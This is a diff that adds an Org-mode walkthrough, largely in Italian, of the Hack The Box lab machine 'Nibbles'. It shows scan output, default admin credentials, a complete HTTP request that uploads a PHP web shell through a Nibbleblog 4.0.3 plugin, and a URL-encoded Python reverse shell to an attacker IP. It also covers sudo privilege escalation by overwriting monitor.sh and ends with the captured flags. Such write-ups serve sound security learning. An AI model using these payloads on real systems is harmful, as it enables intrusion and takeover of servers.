@@ -1,0 +1,372 @@
+#+TITLE: HTB - Nibbles
+#+AUTHOR: Leonardo Tamiano
+#+HTML_HEAD_EXTRA: <style>pre { background-color: #000; color: #bbb; } </style>
+
+* Basic Info
+  :PROPERTIES:
+  :UNNUMBERED: t
+  :END:
+  - *Default IP*: 10.10.10.75
+  - *Video*: [[https://www.youtube.com/watch?v=cowRDytxKuY&t=121s][HTB - Nibbles]]
+  - *Table of contents*:
+    #+TOC: headlines 2
+
+  ------------------------
+  
+  A seguire è riportato un breve walkthrough della macchina *Nibbles*
+  offerta dalla piattaforma Hack the Box.
+
+* Enumeration
+** nmap
+*** nmap -sC -sV nibbles
+    #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-12 02:08 CET
+Nmap scan report for nibbles (10.129.66.223)
+Host is up (0.055s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.73 seconds
+    #+end_example
+
+*** nmap -p- nibbles
+    #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-12 02:08 CET
+Nmap scan report for nibbles (10.129.66.223)
+Host is up (0.055s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 19.84 seconds
+    #+end_example
+
+** nibbleblog
+*** credentials
+    #+begin_example
+admin:nibbles
+    #+end_example
+** priv esc
+*** nibbler
+**** user flag
+     #+begin_src sh
+cat /home/nibbler/user.txt     
+     #+end_src
+**** sudo -l
+     #+BEGIN_EXAMPLE
+Matching Defaults entries for nibbler on Nibbles:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+     #+END_EXAMPLE
+
+**** root flag
+     Unzip the ~personal.zip~ file in in nibbles home dir and execute
+     the following
+     
+     #+begin_src sh
+echo "echo /root/root.txt > .logic && chmod 777 .logic" > monitor.sh 
+sudo -u root ./monitor.sh    
+     #+end_src     
+
+   @@html: <hr style="border: 1px solid #A1283B;" />@@
+
+* Walkthrough
+** scans con nmap
+   Uno scan base con nmap rivela la seguente situazione
+
+   *nmap -sC -sV nibbles*
+
+   #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-12 02:08 CET
+Nmap scan report for nibbles (10.129.66.223)
+Host is up (0.055s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.73 seconds
+   #+end_example
+
+   Come possiamo vedere, abbiamo un server in ascolto nella porta
+   $80$.
+   
+** nibbleblog RFI per RCE
+   Andando nella pagina principale del web server e visualizzando il
+   codice html della pagina troviamo il seguente commento
+   
+   #+BEGIN_SRC html
+<!-- /nibbleblog/ directory. Nothing interesting here! -->    
+   #+END_SRC
+
+   Andando nella risorsa ~/nibbleblog~ del sito troviamo una istanza di
+   *nibbleblog*, una blog engine scritta in php. La versione dell'engine
+   è la ~4.0.3~, che è vulneraible alla seguente *Remote File Inclusion*
+   (RFI):
+
+   - https://www.exploit-db.com/exploits/38489
+   - [[https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html][NibbleBlog 4.0.3 Shell Upload]]
+   - [[https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/][How To Upload A Shell In Nibbleblog 4.0.3]]   
+  
+   Per exploitare questa RFI possiamo procedere come segue
+
+   1. Attiviamo il plugin ~my image~ con la seguente richiesta http
+
+      #+begin_src sh
+curl http://nibbles/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image      
+      #+end_src
+
+   2. Carichiamo lo script php facendo finta che sia un'immagine con
+      la seguente richiesta HTTP, che può essere inviata ad esempio
+      con ~burpsuite~.
+
+      #+BEGIN_EXAMPLE
+POST /nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image HTTP/1.1
+Host: nibbles
+Content-Length: 1026
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://nibbles
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydfj2vBXAZsGAFBeB
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://nibbles/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=tj71gvde5ucrj0jirrlt5e11h5
+Connection: close
+
+------WebKitFormBoundarydfj2vBXAZsGAFBeB
+Content-Disposition: form-data; name="plugin"
+
+my_image
+------WebKitFormBoundarydfj2vBXAZsGAFBeB
+Content-Disposition: form-data; name="title"
+
+My image
+------WebKitFormBoundarydfj2vBXAZsGAFBeB
+Content-Disposition: form-data; name="position"
+
+4
+------WebKitFormBoundarydfj2vBXAZsGAFBeB
+Content-Disposition: form-data; name="caption"
+
+
+------WebKitFormBoundarydfj2vBXAZsGAFBeB
+Content-Disposition: form-data; name="image"; filename="shell.php"
+Content-Type: application/x-php
+
+<?php echo system($_REQUEST['cmd']) ?>
+------WebKitFormBoundarydfj2vBXAZsGAFBeB
+Content-Disposition: form-data; name="image_resize"
+
+1
+------WebKitFormBoundarydfj2vBXAZsGAFBeB
+Content-Disposition: form-data; name="image_width"
+
+230
+------WebKitFormBoundarydfj2vBXAZsGAFBeB
+Content-Disposition: form-data; name="image_height"
+
+200
+------WebKitFormBoundarydfj2vBXAZsGAFBeB
+Content-Disposition: form-data; name="image_option"
+
+auto
+------WebKitFormBoundarydfj2vBXAZsGAFBeB--
+      #+END_EXAMPLE
+
+   3. Una volta che abbiamo caricato la shell nel server remoto
+      possiamo eseguire il nostro codice e spawnare una reverse shell
+      
+      #+BEGIN_SRC sh
+http://nibbles/nibbleblog/content/private/plugins/my_image/image.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.95%22,4321));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27%20&
+      #+END_SRC
+
+** user flag
+   Una volta che siamo dentro la macchina possiamo leggere
+   direttamente la user flag situata nella seguente path
+
+   #+begin_example
+/home/nibbler/user.txt
+   #+end_example
+
+   in quanto siamo loggati come l'utente ~nibbler~.
+
+** root flag
+   Per ottenere la root flag invece dobbiamo prima unzippare il file
+   ~personal.zip~ presente nella home directory dell'utente ~nibbler~.
+
+   Eseguendo il comando ~sudo -l~ troviamo la seguente situazione
+
+   #+BEGIN_EXAMPLE
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh     
+   #+END_EXAMPLE
+
+   Come possiamo vedere, l'utente ~nibbler~ può esseguire lo script
+   ~monitor.sh~ situato nella seguente path
+
+   #+begin_example
+/home/nibbler/personal/stuff
+   #+end_example
+
+   L'idea quindi è quella di modificare lo script ~monitor.sh~ e di
+   eseguirlo come root
+   
+   #+begin_src sh
+echo "echo /root/root.txt > .logic && chmod 777 .logic" > monitor.sh 
+sudo -u root ./monitor.sh    
+   #+end_src     
+
+* Extra
+  A seguire qualche note extra.
+  
+** Analisi RFI Nibbleblog 4.0.3
+   Per capire come è stato possibile exploitare la RFI di ~nibbleblog
+   4.0.3~ scarichiamo il codice dal seguente mirror.
+
+   [[https://www.download3k.com/Install-Nibbleblog.html][Nibbleblog 4.0.3 Download Mirrors]]
+
+   La vulneraiblità è presente nella funzione ~move_uploaded_file()~,
+   riportata qui a seguire. Da notare il commento "WARNING".
+   
+     #+BEGIN_SRC php
+if( ($_SERVER['REQUEST_METHOD'] == 'POST') && isset($_POST['plugin']) )
+{
+	$plugin = $plugins_all['PLUGIN_'.strtoupper($_POST['plugin'])]; // PLUGIN_MY_IMAGE
+
+	if( $plugin->init_db() )
+	{
+		// upload files
+		foreach($_FILES as $field_name=>$file)
+		{
+			// get file extension (.php)
+			$extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+			
+			// get destination dir (/content/private/plugins/my_image)
+			$destination = PATH_PLUGINS_DB.$plugin->get_dir_name();
+			
+			// complete file name
+			$complete = $destination.'/'.$field_name.'.'.$extension;
+
+			// WARNING (!!!): no checks on the extension are made
+			// before uploading!  Upload the new file and move
+			if(move_uploaded_file($file["tmp_name"], $complete))
+			{
+				// Resize images if requested by the plugin
+				if(isset($_POST[$field_name.'_resize']))
+				{
+					$width = isset($_POST[$field_name.'_width'])?$_POST[$field_name.'_width']:200;
+					$height = isset($_POST[$field_name.'_height'])?$_POST[$field_name.'_height']:200;
+					$option = isset($_POST[$field_name.'_option'])?$_POST[$field_name.'_option']:'auto';
+					$quality = isset($_POST[$field_name.'_quality'])?$_POST[$field_name.'_quality']:100;
+
+					$Resize->setImage($complete, $width, $height, $option);
+					$Resize->saveImage($complete, $quality, true);
+				}
+			}
+		}
+
+		unset($_POST['plugin']);
+
+		// update fields
+		$plugin->set_fields_db($_POST);
+
+		Session::set_alert($_LANG['CHANGES_HAS_BEEN_SAVED_SUCCESSFULLY']);
+	}
+}
+     #+END_SRC
+
+** Crack password + Salt                                           :noexport:
+   Once we are inside we can access the
+   ~/var/www/html/nibbleblog/content/private~ to get from the ~shadow.php~
+   file the following content
+     
+   #+BEGIN_SRC php
+<?php
+$_USER[0]["uid"] = "0";
+$_USER[0]["username"] = "admin";
+$_USER[0]["password"] = "ea8e3c9799c10e2982c0b54299fd866f32b95f5a";
+$_USER[0]["salt"] = "8^8!@tv&zb3";
+// ...
+?>
+   #+END_SRC
+
+   As we can see, we have an hashed password and a salt. Using
+   ~hash-identifier~ we get
+     
+   #+BEGIN_EXAMPLE
+Possible Hashs:
+[+] SHA-1                                         
+[+] MySQL5 - SHA-1(SHA-1($pass))
+   #+END_EXAMPLE
+
+* Legacy Walkthrough                                               :noexport:
+  #+begin_src sh
+nmap -sV -sC -oA nmap 10.10.10.75
+dirb http://10.10.10.75 -r -o tempo.dirb  
+  #+end_src
+
+  In ~nibbleblog/admin.php~ there is a login page. User credentials are,
+  username: admin, password: nibbles.
+
+  Use plugin ~'my image'~ to load file. Supposedly we have to load an
+  image, however we can mask a php file to look like an image. With
+  this we can get code execution. In particular we want to upload the
+  following php code
+  
+  #+begin_src php
+<?php echo system($_REQUEST['ipp']) ?>  
+  #+end_src
+    
+  So that we'll be able to execute remote code by sending requests to
+  the server. However, to upload this we'll have to mask it an
+  image. Using BurpSuite we can fake an image with a php file.
+
+  Once we upload the php file we can then send requests to open a
+  remote shell. 
+
+  Once having a remote shell we simply do ~sudo -l~ and realize that we
+  can execute as root the file in
+  ~/home/nibbles/personal/stuff/monitor.sh~.
+
+  To exploit this we can do the following
+  
+  #+begin_src sh
+echo "echo /root/root.txt > .logic && chmod 777 .logic" > monitor.sh 
+sudo -u root ./monitor.sh    
+  #+end_src
+
+  ---------
+
+  To get root access you can also use [[https://www.exploit-db.com/exploits/44298/][CVE 2017-16995]].
+* Flags                                                            :noexport:
+  - *user*: 2c281f318555dbc1b856957c7147bfc1
+  - *root*: cc4f0afe3a1026d402ba10329674a8e2
